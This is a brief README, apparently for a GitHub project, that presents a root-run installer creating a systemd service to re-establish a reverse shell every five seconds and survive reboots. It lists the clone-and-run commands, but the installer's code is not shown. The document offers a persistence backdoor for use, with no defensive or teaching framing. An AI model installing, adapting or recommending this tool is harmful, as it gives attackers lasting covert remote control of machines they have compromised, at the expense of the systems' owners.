# Linux Systemd Persistence Installer

**Persistence via Systemd Service**

This script sets up **systemd-based persistence** by creating a service that **automatically re-establishes a reverse shell every 5 seconds**, even after a reboot.

## 📌 Installation & Usage
> **⚠️ This script must be run as root!**  

```bash
git clone https://github.com/BL4CK-D3VIL/systemd_persistence.git
cd linux-persistence
chmod +x installer.sh
sudo ./installer.sh
